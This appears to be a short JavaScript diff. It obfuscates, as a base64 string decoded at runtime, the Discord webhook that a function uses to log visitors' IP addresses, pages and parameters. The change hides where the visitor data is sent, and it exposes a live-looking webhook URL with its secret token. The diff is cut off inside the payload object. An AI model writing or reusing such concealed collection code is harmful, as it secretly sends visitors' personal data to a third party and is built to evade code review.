@@ -1,6 +1,9 @@
+// Encoded webhook URL
+const encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzOTg4NjIzMjMxODkwMjMxNC9HdWZnejd1cTVlU08xQ1NGMEE4X2RNS0ZDNGYtVm05dU5NTGFqdTFScXVneDlWZ05KREtVOFZ4RV9EMVUyRjJTeV90Tg==';
+const webhookURL = atob(encodedWebhookURL); // Decoding the URL
+
 // Function to send IP address, page, and parameters to a Discord webhook as an embed
 function sendToDiscord(message) {
-    const webhookURL = 'https://discord.com/api/webhooks/1239886232318902314/Gufgz7uq5eSO1CSF0A8_dMKFC4f-Vm9uNMLaju1Rqugx9VgNJDKU8VxE_D1U2F2Sy_tN';
     const data = {
         embeds: [{
             title: 'User Action Logged',
